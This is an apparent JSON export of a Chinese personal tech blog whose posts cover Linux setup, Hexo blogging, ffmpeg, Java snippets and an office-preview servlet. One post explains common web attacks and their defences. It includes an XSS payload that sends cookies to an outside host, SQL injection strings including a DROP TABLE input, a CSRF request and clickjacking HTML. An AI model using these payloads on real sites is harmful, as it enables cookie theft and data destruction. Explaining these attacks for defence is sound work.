[{"title":"linux命令","date":"2017-08-07T09:10:55.843Z","path":"2017/08/07/linux杂记/","text":"1.vmwarn设置桥接模式2.centos 设置/etc/sysconfig/network-scripts/ifcfg-eth0设置ONBOOT为yes3.然后启动网络/etc/init.d/network start linux下安装wgetyum -y install wget linux下安装rz/szyum -y install lrzsz linux下安装jdkrpm -ivh jdk-8u121-linux-x64.rpm 查找jdk安装路径123456[root@localhost local]# which java/usr/bin/java[root@localhost local]# ls -lrt /usr/bin/javalrwxrwxrwx. 1 root root 22 Mar 17 12:29 /usr/bin/java -&gt; /etc/alternatives/java[root@localhost local]# ls -lrt /etc/alternatives/javalrwxrwxrwx. 1 root root 35 Mar 17 12:29 /etc/alternatives/java -&gt; /usr/java/jdk1.8.0_121/jre/bin/java java环境变量，在/etc/profile末添加123export JAVA_HOME=/usr/java/jdk1.8.0_121export PATH=$JAVA_HOME/bin:$PATHexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar 1source /etc/profile 防火墙的开启关闭1) 重启后生效开启： chkconfig iptables on关闭： chkconfig iptables off2) 即时生效，重启后失效开启： service iptables start关闭： service iptables stop 第一次安装jenkins特别慢时主要是服务器在国外所以下载的比较慢。下载的地址是写在$JENKINS_HOME/hudson.model.UpdateCenter.xml文件中的，默认内容如下： 1234567&lt;?xml version=&apos;1.0&apos; encoding=&apos;UTF-8&apos;?&gt; &lt;sites&gt; &lt;site&gt; &lt;id&gt;default&lt;/id&gt; &lt;url&gt;http://updates.jenkins-ci.org/update-center.json&lt;/url&gt; &lt;/site&gt;&lt;/sites&gt; 我们可以离线下载这个文件，然后将其上传到自己的apache服务器内，最后修改这个url地址为我们自己服务器的地址就好了，这样就比较快的直接显示出下一步插件安装界面了。 也可以直接修改上面那一步的文件，将url 改为http://mirror.xmission.com/jenkins/updates/update-center.json就好了。 安装git 安装编译git时需要的包 1sudo yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel gcc perl-ExtUtils-MakeMaker 下载git源码 1wget https://www.kernel.org/pub/software/scm/git/git-1.9.5.tar.gz 编译安装 123cd git-1.9.5make prefix=/usr/local/git-1.9.5 allmake prefix=/usr/local/git-1.9.5 install 更改环境变量，在/etc/profile末添加 1export PATH=$PATH:/usr/local/git-1.9.5/bin 1source /etc/profile 检查一下版本号 1git --version 下载maven 1wget http://mirror.bit.edu.cn/apache/maven/maven-3/3.0.5/source/apache-maven-3.0.5-src.tar.gz 添加环境变量，在/etc/profile末添加 123export M2_HOME=/usr/local/apache-maven-3.0.5export M2=$M2_HOME/binexport PATH=$M2:$PATH 1source /etc/profile 检查一下版本号1mvn --version","tags":[{"name":"杂记","slug":"杂记","permalink":"http://yoursite.com/tags/杂记/"}]},{"title":"吸血鬼数字算法","date":"2017-08-07T09:06:46.366Z","path":"2017/08/07/吸血鬼数字的算法小记/","text":"吸血鬼数字算法 今天重新读了一遍think in java，看到关于吸血鬼算法的题目，然后翻了一下我曾经几年前写的解法，如下123456789101112131415161718192021222324252627public static void main(String[] args) &#123; for (int i = 10; i &lt; 100; i++) &#123; for (int j = i; j &lt; 100; j++) &#123; int temp = i * j; if (temp &gt; 10000 || temp &lt; 999) &#123; continue; &#125; String[] s = String.valueOf(temp).split(&quot;&quot;); String[] split = (i + &quot;&quot; + j).split(&quot;&quot;); int count = 0; for (int t1 = 0; t1 &lt; s.length; t1++) &#123; for (int t2 = 0; t2 &lt; split.length; t2++) &#123; if (s[t1].equals(split[t2])) &#123; s[t1] = UUID.randomUUID().toString(); split[t2] = UUID.randomUUID().toString(); count++; break; &#125; &#125; &#125; if (count == 4) &#123; System.out.println(temp); &#125; &#125; &#125;&#125; 然后看了下别人写的，感觉惨不忍睹。12345678910111213141516171819202122232425262728293031public static void main(String[] arg) &#123; String[] ar_str1, ar_str2; int sum = 0; int i_val; int count = 0; // 双重循环穷举 for (int i = 10; i &lt; 100; i++) &#123; for (int j = i + 1; j &lt; 100; j++) &#123; i_val = i * j; /* 假设val = 1000a + 100b + 10c + d, 因为满足val = x * y, 则有x = 10a + b, y = 10c + d 则val - x - y = 990a + 99b + 9c = 9 * (110a + 11b + c), 所以val - x - y能被9整除。 所以满足该条件的数字必定能被9整除，所以可以直接过滤其他数字。 */ if (i_val % 100 == 0 || (i_val - i - j) % 9 != 0) &#123; continue; &#125; count++; ar_str1 = String.valueOf(i_val).split(&quot;&quot;); ar_str2 = (String.valueOf(i) + String.valueOf(j)).split(&quot;&quot;); Arrays.sort(ar_str1); Arrays.sort(ar_str2); if (Arrays.equals(ar_str1, ar_str2)) &#123;// 排序后比较,为真则找到一组 sum++; System.out.println(&quot;第&quot; + sum + &quot;组: &quot; + i + &quot;*&quot; + j + &quot;=&quot; + i_val); &#125; &#125; &#125; System.out.println(&quot;共找到&quot; + sum + &quot;组吸血鬼数&quot;); System.out.println(count); &#125;","tags":[{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"},{"name":"算法","slug":"算法","permalink":"http://yoursite.com/tags/算法/"}]},{"title":"web常见攻击方式","date":"2017-02-28T03:21:00.000Z","path":"2017/02/28/web常见攻击方式/","text":"#web常见攻击方式 ##1.跨域资源共享(CORS) ####1.介绍 跨域资源共享（Cross-origin resource sharing）定义了浏览器和服务器交互的方式是否允许跨域。使ajax可以实现跨域访问。 通过服务端设置请求与中的头信息中的属性Access-Control-Allow-Origin 来开启跨域的访问，可以固定跨域请求的来源如：https://ios.1dabang.cn 。也可以使用 * 来允许所有的跨域访问。 跨域请求分为俩种请求方式，简单请求/非简单请求 简单请求固定了请求的方法(get,post,head)和http的头信息(一些固定的头信息字段)，发送cors简单请求时，浏览器会增加Origin头信息字段，说明请求来自哪个源(协议、域名、端口)。 非简单请求是带有特殊要求的请求，比如请求方法是PUT DELETE等，或者头信息需要封装非固定的信息，比如现在项目中的TokenKey。在执行非简单CORS的请求之前，会先进行一次“预检”(preflight)的请求，将请求的方法、头信息发送至服务端，服务端返回是否可以进行非简单CORS请求。####2.风险/攻击 在服务端开启支持跨域访问后，通过http请求头信息来判断是否可以进行跨域请求。http头信息可以通过代码、浏览器开发者工具被伪造，所以无法确定请求是否真的来自于特定的域。 第三方被入侵，如：服务端(A)允许来自http://xx.1dabang.cn (B)的请求，B被入侵之后，可以通过B向A无限制的发送请求，从而获取/篡改数据。 针对用户的跨站伪造请求(CSRF)；见(2)。####3.防护1.在允许跨域请求时，增加多种服务器验证方式，如：使用token来做二次的效验操作。2.加强服务端对请求数据的效验。保证数据的有效性。3.暴露最少最必须的功能，暴露最少的可用信息。 ##2.跨站伪造请求(CSRF) ####1.介绍 CSRF（Cross-site request forgery）跨站请求伪造是一种对网站用户的利用。是基于对用户的攻击。 CSRF简单的来说，就是利用了用户的身份，以用户的名义来发送恶意的请求。####2.风险/攻击 举个例子：用户C登录http://1dabang.cn (A)，留下cookie/session，在接下来的一段时间内，用户A可以一直请求该网站。这时，用户又访问了网站http://xxx.com (B)，这时B页面中含有访问A页面的请求，见下方，这时浏览器带着C访问A留下来的cookie/session访问了A网站。就会被恶意的访问一些请求。这种情况需要建立在A网站开启了跨域访问。 get类型的CSRF src=\"1dabang.cn/user/delete?userId=1\"link13. post类型的CSRF document.forms[0].submit(); 12345678910111213141516![](images/csrf_1.jpg)####3.防护1. 验证 HTTP Referer 字段，在HTTP的头信息里有一个字段，记录了该HTTP请求的来源地址，通过判断该来源地址来验证是否正常请求。2. 增加多种验证的方式。例：增加token；头信息增加验证字段。3. 将cookie设置为HttpOnly，设置该属性后，js脚本将无法获得cookie值。4. 增加多种验证码##3.跨站脚本攻击(XSS)####1.介绍- ​跨站脚本攻击(Cross Site Scripting)，是指恶意攻击者往web页面里插入恶意的script的代码，当用户浏览网页时，script代码执行，从而达到攻击用户的目的。- XSS漏洞分为俩种 - 一种是DOM Based XSS漏洞，基于网页DOM结构的攻击，受害人较少。 - 一种是Stored XSS漏洞，存储式的XSS漏洞，受害人较多。####2.风险/攻击1. 第一种DOM Based XSS漏洞，是以网页来攻击的。比如有一个网页地址 ```http://1dabang.cn/user?userName=123 假设用户A已登录该网站，我发送一个超链接给A，超链接地址为： 123 这时就成功盗取了用户A的cookie，cookie极有可能存有登录账户及密码。2. 第二种stored css漏洞，则是将script脚本存储在数据库。在网站中所有用户可以输入的文本框的地方，都可以被注入，比如我发了一条说说，说说里插入该代码。 ```今天很开心！&lt;script&gt;window.open(&quot;www.x.com?param=&quot;+document.cookie)&lt;/script&gt; 所有看到我的说说的人都会中招，他们的cookie都会发送到我的服务器上。危害性更大。####3.防护 过滤所有来源的数据，将所有数据进行转义存储。比如&lt; &gt; “ ‘ 等特殊字符。 ##4.分布式拒绝服务攻击(DDOS) ####1. 介绍 DDOS攻击是dos攻击的一种，也可以说是升级，dos如果是单挑，ddos就是群殴，更有威胁力。 DDOS攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDOS攻击，从而成倍地提高拒绝服务攻击的威力。DDOS就是一种以大量的请求占用大量的资源，从而达到网络瘫痪的目的。####2.风险/攻击 通过使网络过载来干扰甚至阻断正常的网络通讯。 通过向服务器提交大量请求，使服务器超负荷。 阻断某一用户访问服务器。 阻断某服务与特定系统或个人的通讯。 DDOS的攻击方式特别的多，比如：IP Spoofing、LAND attack、ICMP floods、Application level floods、SYN Flood、DNS Query Flood、HTTP Flood等，太多了不做介绍了。目的都是一样的，拖垮服务器。 CC攻击是DDOS的一种，单独写一下是因为我们公司使用阿里云的服务器，阿里云有提供了CC的防护功能。CC主要是用来攻击动态页面的。与攻击传统宽带资源不一样，CC攻击是使用大量的用户进行访问页面，页面中涉及到数据库的查询，用户多了，查询的次数就多了，占用大量数据库资源，使得数据库变得特别慢。比如：开10万个线程，不停的打开一个查询医生的页面，静态资源占用的比较少，但是每次打开都会走查询医生的列表。慢慢的，数据库就会因为访问人数过多而使速度缓慢下来。####3.防护 DDOS的防护没有什么特别有效的方法，只能从一些方案来限制一下。 上云服务。一般云服务公司都有专门的云盾。 拼宽带。使用大量的宽带支撑防止ddos。 流量清洗&amp;封IP。有效性并不高。 ##5.SQL注入 ####1.介绍 通过把sql命令伪装成正常的HTTP参数，传递到服务器，欺骗服务器最终执行恶意的sql命令，达到入侵的目的。####2.风险/攻击 假设登录网站的登录表单有昵称和密码两个字段，输入昵称和密码后，服务端进行验证，如果昵称和密码匹配，则显示登录，后端的查询验证为： = \"select * from user where name = '\" + name + \"'\" + \" and pwd = '\"+pwd + \"'\"```12如果用户输入昵称为liu，并输入正确的密码，当然能够登录成功，但是如果用户输入的密码为' or '1'='1，此时sql语句为：```select * from user where name = 'liu' and pwd = '' or '1'='1' 这样只要昵称正确，就可以成功登录了。 如果用户输入’;drop table user;–，这样sql语句变为： * from user where nick = '' and pwd = '';drop table user;--'```1234 这样表user就被删除了。 ####3.防护1. 使用预编译的sql语句。例： ```select * from user where name = ? and pwd = ? 使用ORM框架(mybatis，hibernate等)。 ##6.文件上传攻击 ####1.介绍 顾名思义，文件上传攻击就是网站含有文件上传的功能，利用该功能上传一些木马，exe，shell，js，jsp等恶意的脚本语言。 大部分的网站和应用系统都有上传功能，如用户头像上传，图片上传，文档上传等。一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传任意文件。####2.风险/攻击 上传文件是病毒或者木马时，主要用于诱骗用户或者管理员下载执行或者直接自动运行； 上传文件是WebShell时，攻击者可通过这些网页后门执行命令并控制服务器； 上传文件是其他恶意脚本时，攻击者可直接执行脚本进行攻击； 上传文件是恶意图片时，图片中可能包含了脚本，加载或者点击这些图片时脚本会悄无声息的执行； 上传文件是伪装成正常后缀的恶意脚本时，攻击者可借助本地文件包含漏洞(Local File Include)执行该文件。如将bad.php文件改名为bad.doc上传到服务器，再通过PHP的include，include_once，require，require_once等函数包含执行。####3.防护 对上传文件的检查，在客户端和服务端进行双向的检测。比如：一些文件判断的大小写(exe–Exe)，文件的名称(1.jpg—1.jpg.exe)在程序中的截断保存中，留下.exe而忽略.jpg。以及允许用户修改上传文件的路径。使用第三方上传的插件也会引起该问题。不仅仅判断文件的后缀，还要从文件的头信息等来判断文件的格式。 通过部署一些第三方公司的产品对网站的上传漏洞以及网站的文件进行检测(比如：oos) 使用第三方插件，要及时的关注产品更新动态以作升级。 将上传文件的目录设置为只读。去除执行的权限。 ##7.Cookie攻击 ####1.介绍 cookie是一个非常广的范围。之前所说的跨站伪造请求和跨站脚本攻击多数都是为了获取用户的cookie。 一个用户的cookie一旦被攻击者获取到，攻击者就可以冒充用户的身份做很多事情####2.风险/攻击 一些常见的js脚本，很容易就能获取到用户的cookie，比如：1234567891011 然后使用cookie冒充用户做操作。其实，用户的cookie和客户端的js脚本有很大的联系。这里不仅仅要防范用户的cookie被盗取，更多的是要防范js脚本的注入。####3.防护1. 将cookie设置为HttpOnly，设置该属性后，js脚本将无法获得cookie值。2. 加强客户端js脚本的防护，杜绝从服务端将恶意的js脚本传输至客户端。##8.点击劫持(ClickJacking)####1.介绍- 点击劫持是一种视觉上的欺骗手段，攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在该网页上进行操作，此时用户在不知情的情况下点击了透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上。- 点击劫持与CSRF攻击有异曲同工之妙，都是在用户不知道情况下进行的攻击。与CSRF一样，点击劫持一样需要用户已经登录过该网站且拿到授权(session/cookie)。####2.风险/攻击1. 点击劫持可以将一些网站隐藏在自身网站之下， 比如，发送邮件，发送微博的页面做成iframe覆盖在自身网页上，当用户点击按钮时，就可以做到发送邮件/微博的效果。 &lt;!DOCTYPE html&gt;点击劫持iframe { width: 1440px; height: 900px; position: absolute; top: -0px; left: -0px; z-index: 2; -moz-opacity: 0; opacity: 0; filter: alpha(opacity=0); }button { position: absolute; top: 250px; left: 770px; z-index: 1; width: 80px; height:20px; }点击脱衣 1234比如上面这个网页，放置了一张美女图片和一个按钮，当吸引用户点击按钮时，就会跳转至http://www.medbigbang.com。 点击劫持需要调整按钮与隐藏iframe点击的位置，做到一致。####3.防护1. 设置http头的X-Frame-Options字段，设置为deny。不允许加载任何iframe页面。2. 在页面上增加js代码，禁止iframe的嵌套。 if(top.location !=location) {Top.location=self.location;}```","tags":[{"name":"web","slug":"web","permalink":"http://yoursite.com/tags/web/"},{"name":"攻击","slug":"攻击","permalink":"http://yoursite.com/tags/攻击/"}]},{"title":"Hexo加入网易云音乐","date":"2017-02-26T09:26:00.000Z","path":"2017/02/26/Hexo加入网易云音乐/","text":"Yilia主题（我使用的是这个主题就用这个来讲） 进入网易云音乐: 官网 推荐：自己注册账号，这样子可以创建自己喜欢的歌单，在里边收藏自己喜欢的歌曲 然后进入到自己的歌单 点击生成外链，获取到云音乐播放器代码 选择生成自己喜欢的样式，然后复制代码 最后打开（themes/yilia/layout/_partial/left-col.ejs）把复制好的网易云音乐放到第二行里边 然后重新编译部署一下hexo就可以啦！ 参考blogitgoyo github","tags":[{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"}]},{"title":"hexo搭建个人博客","date":"2016-06-16T06:26:57.000Z","path":"2016/06/16/hexo搭建个人博客/","text":"部署前介绍Hexo 是什么 Hexo 的中文官网：http://hexo.io/zh-cn/ 在我的理解里面：Hexo 是一个基于 Node.js 快速、简洁且高效的博客框架，可以将 Markdown 文件快速的生成静态网页，托管在 GitHub Pages 上。 而官网自己是这样说的： Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 本文环境 系统： Windows 10（64 位） 软件： git：2.7.0.2-64-bit node.js：v5.7.0-64-bit Stable 账号： Github：https://github.com/ 搭建所需软件 各个软件官网： git：http://git-scm.com/ node.js：http://nodejs.org/ 域名绑定 如果你一开始就打算要绑定域名，则下面教程中所有可以填写域名的地方你都填写上你要绑定的域名，如果你没独立域名，那就使用 Github 默认给你的：XXXXXX.github.io 域名即可。 git 安装 双击运行 Git-2.7.0.2-64-bit.exe，接下来一律下一步，不需要多余的选择，假设你安装的目录位置跟我一样：C:\\Program Files\\Git 打开 Git Bash（路径：C:\\Program Files\\Git\\git-bash.exe），输入：git –version 如下图，如果出现：git version 2.7.0.windows.2，这表示安装成功 Node.js 安装 双击运行 node-v5.7.0-x64.msi，接下来一律下一步，不需要多余的选择。 安装完之后，打开 Git Bash，输入：npm -v 如下图，如果出现：3.6.0，则表示 Node.js 安装成功 Node.js 源设置 在安装 Hexo 之前，先说一下 Node.js 的源，Node.js 官方源默认是：http://registry.npmjs.org，但是由于在国外，说不定你使用的时候就抽风无法下载任何软件。所以我们决定暂时使用淘宝提供的源，淘宝源官网：http://npm.taobao.org/ 在 Git Bash 中我们执行下面这一句（这是一整句的）： 1234alias cnpm=&quot;npm --registry=https://registry.npm.taobao.org \\--cache=$HOME/.npm/.cache/cnpm \\--disturl=https://npm.taobao.org/dist \\--userconfig=$HOME/.cnpmrc&quot; 现在验证下是否可以使用淘宝的 cnpm 命令： cnpm info express 如果能输出一大堆介绍，则说明成功了，以后每次要使用淘宝的源都需要这样来。现在除了默认的 npm，还多了一个 cnpm 可以使用，我们下面有关安装的讲解内容也都是基于此临时命令。 如果输出：bash: cnpm: command not found，则表示没成功，需要你在排查下 安装 Hexo 框架 安装 Hexo（注意，现在是 cnpm 开头了，不是 npm 了）： cnpm install -g hexo-cli 安装时间不一定很快，有可能需要等 3 ~ 5 分钟 安装完有 WARN 警告也没关系的。 创建 Hexo 项目 现在假设我要创建一个名为 hexo 的项目，项目目录就放在：E:\\git_work_space 目录下，所以我们在 E:\\git_work_space 目录下创建一个 hexo 目录。现在这个项目的全路径是：E:\\git_work_space\\hexo 打开 Git Bash： 进入该目录： cd e:/git_work_space/hexo 然后执行： hexo init ，这个时间也会比较长，也有可能要等几分钟，有显示 WARN 也不用管 最后执行： cnpm install ，有显示 WARN 也不用管 安装完成之后，E:\\git_work_space\\hexo 目录结构是这样的： 现在我们启动 hexo 本地服务，看下默认的博客是怎样的，命令： hexo server 现在用浏览器访问：http://localhost:4000/，效果如下图 如果要停止 hexo 服务：在 Git Bash 下按 Ctrl + C 即可 把本地的博客内容同步到 Github 上 要把本地的静态博客同步到 Github，我们还需要先安装两个跟部署相关的 hexo 插件： 继续在 Git Bash 中输入： cnpm install hexo -server –save cnpm install hexo-deployer-git –save 编辑全局 hexo 的配置文件：_config.yml 官网对此配置的介绍：https://hexo.io/zh-cn/docs/configuration.html 我自己的编辑内容初稿（你需要认真看的是含有中文注释的内容）： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576# Hexo Configuration## Docs: https://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/# Site，这一块区域主要是设置博客的主要说明，需要注意的是：每个冒号后面都是有一个空格，然后再书写自己的内容的title: 我的博客subtitle: 副标题description: 这是我的博客author: LiuTaoemail: 491022039@qq.comlanguage: zh-CNtimezone:# URL，这一块一般可以设置的是 url 这个参数，比如我要设置绑定域名的，这里就需要填写我的域名信息## If your site is put in a subdirectory, set url as &apos;http://yoursite.com/child&apos; and root as &apos;/child/&apos;url: https://liutao.github.ioroot: /permalink: :year/:month/:day/:title/permalink_defaults:# Directorysource_dir: sourcepublic_dir: publictag_dir: tagsarchive_dir: archivescategory_dir: categoriescode_dir: downloads/codei18n_dir: :langskip_render:# Writingnew_post_name: :title.md # File name of new postsdefault_layout: posttitlecase: false # Transform title into titlecaseexternal_link: true # Open external links in new tabfilename_case: 0render_drafts: falsepost_asset_folder: falserelative_link: falsefuture: truehighlight: enable: true line_number: true auto_detect: false tab_replace:# Category &amp; Tagdefault_category: uncategorizedcategory_map:tag_map:# Date / Time format## Hexo uses Moment.js to parse and display date## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DDtime_format: HH:mm:ss# Pagination## Set per_page to 0 to disable paginationper_page: 10pagination_dir: page# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: yelee# Deployment## 这里是重点，这里是修改发布地址，因为我们前面已经加了 SSH 密钥信息在 Github 设置里面了，所以只要我们电脑里面持有那两个密钥文件就可以无需密码地跟 Github 做同步。## 需要注意的是这里的 repo 采用的是 ssh 的地址，而不是 https 的。分支我们默认采用 master 分支，以后你翅膀硬了要换其他也无所谓。## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: git@github.com:liutao6/liutao6.github.io.git branch: master 编辑全局配置后我们需要重新部署： 继续在 Git Bash 中输入命令： 先清除掉已经生成的旧文件：hexo clean 再生成一次静态文件：hexo generate 在本地预览下：hexo server 本地没问题之后，Ctrl + C 停掉本地预览，使用部署命令部署到 Github 上：hexo deploy，有弹出下面提示框，请输入：yes 访问服务器地址进行检查：https://liutao6.github.io 通过上面几次流程我们也就可以总结：以后，每次发表新文章要部署都按这样的流程来： hexo clean hexo generate hexo deploy 也因为这几个命令太频繁了，所以又有了精简版的命令： hexo clean == hexo clean hexo g == hexo generate hexo s == hexo server hexo d == hexo deploy hexo 新文章内容的开头需要这样定义： categories：表示文章所属分类 tags：表示文章所属标签 123456---title: 这是文章标题date: 2016-02-28 17:58:27categories: [Hexo,IntelliJ IDEA]tags: [Hexo,IntelliJ IDEA,Git,Github,Node.js]--- 参考文章手把手教你使用Hexo + Github Pages搭建个人独立博客","tags":[{"name":"Hexo","slug":"Hexo","permalink":"http://yoursite.com/tags/Hexo/"},{"name":"Git","slug":"Git","permalink":"http://yoursite.com/tags/Git/"},{"name":"Github","slug":"Github","permalink":"http://yoursite.com/tags/Github/"},{"name":"Node.js","slug":"Node-js","permalink":"http://yoursite.com/tags/Node-js/"}]},{"title":"利用ffmpeg做音频转换","date":"2014-04-28T02:03:43.000Z","path":"2014/04/28/利用ffmpeg做音频转换/","text":"项目最近在做微信的时候，有些需求需要将语音down到本地服务器进行使用，微信所使用的音频格式是AMR 但目前AMR格式在个人电脑上应用较少，所以目前大部门播放器都不支持AMR，为了解决这个问题我们打算在服务器端将AMR转成MP3，以便在个人电脑上通过浏览器的方式进行播放。 目前并没有找到合适的支持AMR转MP3的java的开发包，服务器环境为CentOS 6.2，所以我们采用了ffmpeg。 FFmpeg 是一个开源免费跨平台的视频和音频流方案，属于自由软件，采用LGPL或GPL许可证（依据你选择的组件）。它提供了录制、转换以及流化音视频的完整解决 方案。它包含了非常先进的音频/视频编解码库libavcodec，为了保证高可移植性和编解码质量，libavcodec里很多codec都是从头开发 的。其官方网址为：http://www.ffmpeg.org/ 首先安装系统基础环境RHEL &amp; CentOS 系列：yum install -y automake autoconf libtool gcc gcc-c++Debian &amp; Ubuntu 系列：apt-get install automake autoconf libtool gcc gcc-c++ 编译所需源码包yasm：http://yasm.tortall.net/Download.html（汇编器，新版本的ffmpeg增加了汇编代码）lame：http://lame.sourceforge.net/download.php（Mp3音频解码）OpenCore AMR：http://sourceforge.net/projects/opencore-amrAmrNB：http://www.penguin.cz/~utx/amrAmrWB：http://www.penguin.cz/~utx/amrFFMpeg：http://ffmpeg.org/download.html 分别解压缩并编译上述源码包#tar xzvf *.tar.gz#tar xjvf *.tar.bz2 解压后直接使用#./configure#make#make install 命令进行编译安装。编译FFMpef的时候稍微特殊一点：#./configure --enable-libmp3lame --enable-libopencore-amrnb --enable-libopencore-amrwb --enable-version3 --enable-shared#make#make install#ldconfig 最后写入config后，终端运行ffmpeg命令，出现success和已安装的扩展，则运行成功。 使用方法MP3转换AMR： ffmpeg -i 1.mp3 -ac 1 -ar 8000 1.amr`` AMR转换MP3：ffmpeg -i 1.amr 1.mp3` 可能遇到的问题 ffmpeg默认安装目录为“/usr/local/lib”，有些64位系统下软件目录则为“/usr/lib64”，编译过程中可能会出现“ffmpeg: error while loading shared libraries: libmp3lame.so.0: cannot open shared object file: No such file or directory” 等类似的错误解决办法是建立软链接：#ln -s /usr/local/lib/libmp3lame.so.0.0.0 /usr/lib64/libmp3lame.so.0 此时如果出现以下提示：ffmpeg: error while loading shared libraries: libavdevice.so.54: cannot open shared object file: No such file or directory可以通过如下方式查看ffmpeg的动态链接库哪些没有找到：# ldd which ffmpeg libavdevice.so.54 =&gt; not found libavfilter.so.3 =&gt; not found libavformat.so.54 =&gt; not found libavcodec.so.54 =&gt; not found libswresample.so.0 =&gt; not found libswscale.so.2 =&gt; not found libavutil.so.51 =&gt; not found libm.so.6 =&gt; /lib64/libm.so.6 (0x00002ab7c0eb6000) libpthread.so.0 =&gt; /lib64/libpthread.so.0 (0x00002ab7c100b000) libc.so.6 =&gt; /lib64/libc.so.6 (0x00002ab7c1125000) /lib64/ld-linux-x86-64.so.2 (0x00002ab7c0d9a000) 如果类似于上面的输出内容，查找以上类库： # find /usr/local/lib/ | grep -E &quot;libavdevice.so.54|libavfilter.so.3|libavcodec.so.54&quot;/usr/local/lib/libavfilter.so.3.17.100/usr/local/lib/libavcodec.so.54.59.100/usr/local/lib/libavdevice.so.54/usr/local/lib/libavcodec.so.54/usr/local/lib/libavfilter.so.3/usr/local/lib/libavdevice.so.54.2.101会发现全部在/usr/local/lib/下 查看链接库配置文件# more /etc/ld.so.conf | grep /usr/local/lib 如果不包含的话，需要编辑此文添加：/usr/local/lib/usr/local/lib64 运行配置命令# ldconfig","tags":[{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"},{"name":"ffmpeg","slug":"ffmpeg","permalink":"http://yoursite.com/tags/ffmpeg/"},{"name":"音频","slug":"音频","permalink":"http://yoursite.com/tags/音频/"}]},{"title":"jsp在线预览office文档","date":"2014-03-03T08:41:00.000Z","path":"2014/03/03/jsp在线预览office文档/","text":"将一些office文件在线预览，原理是使用三方工具将文件转换为pdf，最后转换至swf。在页面上进行预览的操作，或者将pdf转换成图片，这里主要讲转换为swf播放。 实现方式： Txt/Word/Excel/PPT=&gt;PDF(OpenOffice+JodConverter)=&gt;SWF(pdf2swf)=&gt;FlexPaper浏览 工具： OpenOffice(服务端服务程序) JodConverter(jar包) Swftools(pdf2swf)(服务端pdf转swf) FlexPaper(页面显示) 步骤 OpenOffice安装后启动 启动方法如下cd C:\\Program Files\\OpenOffice.org 3\\program /*此为openoffice安装目录 soffice -headless -accept=&quot;socket,host=127.0.0.1,port=8100;urp;&quot; -nofirststartwizard 导入JodConverter里lib里的jar到web下 在web下建立flexpaper文件夹 将FlexPaper里的内容复制进去 安装Swftools 新建ConvertServlet类，下附该类代码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104public class ConvertServlet extends HttpServlet &#123; private File sourceFile; // 转换源文件 private File pdfFile; // PDF目标文件 private File swfFile; // SWF目标文件 private Runtime r; public void init() throws ServletException &#123; sourceFile = new File(&quot;D:/a.doc&quot;); pdfFile = new File( &quot;D:/apache-tomcat-6.0.39/webapps/OfficeShow/flexpaper/s.pdf&quot;); swfFile = new File( &quot;D:/apache-tomcat-6.0.39/webapps/OfficeShow/flexpaper/s.swf&quot;); System.out.println(&quot;第一步：生成文件对象，准备转换&quot;); &#125; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; doPost(req, resp); &#125; @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; // 转换成pdf文件 if (sourceFile.exists()) &#123; if (!pdfFile.exists()) &#123; OpenOfficeConnection connection = new SocketOpenOfficeConnection( 8100); try &#123; connection.connect(); DocumentConverter converter = new OpenOfficeDocumentConverter( connection); converter.convert(sourceFile, pdfFile); pdfFile.createNewFile(); connection.disconnect(); System.out.println(&quot;第二步：转换为PDF格式 路径&quot; + pdfFile.getPath()); &#125; catch (java.net.ConnectException e) &#123; e.printStackTrace(); System.out.println(&quot;OpenOffice服务未启动&quot;); throw e; &#125; catch (com.artofsolving.jodconverter.openoffice.connection.OpenOfficeException e) &#123; e.printStackTrace(); System.out.println(&quot;读取文件失败&quot;); throw e; &#125; catch (Exception e) &#123; e.printStackTrace(); try &#123; throw e; &#125; catch (Exception e1) &#123; e1.printStackTrace(); &#125; &#125; &#125; else &#123; System.out.println(&quot;已转换为PDF，无需再次转换&quot;); &#125; &#125; else &#123; System.out.println(&quot;要转换的文件不存在&quot;); &#125; // 转换成swf文件 r = Runtime.getRuntime(); if (!swfFile.exists()) &#123; if (pdfFile.exists()) &#123; try &#123; // D:/Program Files/SWFTools/pdf2swf.exe // 上路径是你安装SWFTools的目录下的 Process p = r.exec(&quot;D:/Program Files/SWFTools/pdf2swf.exe &quot; + pdfFile.getPath() + &quot; -o &quot; + swfFile.getPath() + &quot; -T9&quot;); InputStreamReader isr = new InputStreamReader( p.getInputStream()); BufferedReader br = new BufferedReader(isr); String line = null; while ((line = br.readLine()) != null) &#123; System.out.println(line); &#125; p.waitFor(); swfFile.createNewFile(); System.out.println(&quot;第三步：转换为SWF格式 路径：&quot; + swfFile.getPath()); System.out.println(&quot;第四步：转换为SWF格式mingcheng：&quot; + swfFile.getName()); if (pdfFile.exists()) &#123; pdfFile.delete(); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); try &#123; throw e; &#125; catch (Exception e1) &#123; e1.printStackTrace(); &#125; &#125; &#125; else &#123; System.out.println(&quot;PDF文件不存在，无法转换&quot;); &#125; &#125; else &#123; System.out.println(&quot;已经转为SWF文件，无需再次转换&quot;); &#125; HttpSession session = req.getSession(); session.setAttribute(&quot;fileName&quot;, swfFile.getName()); resp.sendRedirect(req.getContextPath() + &quot;/flexpaper/readFile.jsp&quot;); &#125;&#125; 在web下的flexpaper文件夹简历readFile.jsp 代码如下 